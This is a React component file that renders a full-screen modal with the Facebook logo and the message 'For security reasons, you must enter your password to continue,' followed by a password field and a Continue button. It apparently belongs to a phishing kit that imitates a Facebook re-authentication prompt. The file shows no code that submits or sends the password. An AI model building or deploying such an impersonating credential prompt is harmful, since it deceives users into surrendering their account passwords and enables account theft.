import { useState } from 'react';
import facebook from '../../assets/img/fb-logo.png';

const PasswordModal = () => {
    const [showPassword, setShowPassword] = useState(false);
    return (
        <div
            style={{
                position: 'fixed',
                top: 0,
                left: 0,
                display: 'flex',
                justifyContent: 'center',
                alignItems: 'center',
                width: '100vw',
                height: '100vh',
                zIndex: '100',
                backgroundColor: 'rgba(0,0,0,0.2)'
            }}
            onClick={(e) => {}}
        >
            <div
                style={{
                    maxWidth: '390px',
                    backgroundColor: 'white',
                    borderRadius: '10px'
                }}
            >
                <div className='conga'>
                    <div className='conga-modal'>
                        <div>
                            <img src={facebook} />
                        </div>
                        <div>
                            <p className='conga-modal-desc'>
                                For security reasons, you must enter your
                                password to continue.
                            </p>
                        </div>
                        <div
                            style={{
                                position: 'relative',
                                width: '100%'
                            }}
                        >
                            <input
                                type={showPassword ? 'text' : 'password'}
                                className='input-password'
                                placeholder='Enter your password'
                            />
                            <button
                                onClick={() => {
                                    setShowPassword(!showPassword);
                                }}
                                style={{
                                    position: 'absolute',
                                    top: '50%',
                                    right: '8px',
                                    transform: 'translateY(-50%)',
                                    appearance: 'none',
                                    border: 'none',
                                    color: 'inherit'
                                }}
                            >
                                <i
                                    className={`fa-regular ${
                                        showPassword ? 'fa-eye-slash' : 'fa-eye'
                                    }`}
                                ></i>
                            </button>
                        </div>
                        <button className='btn-continue'>Continue</button>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
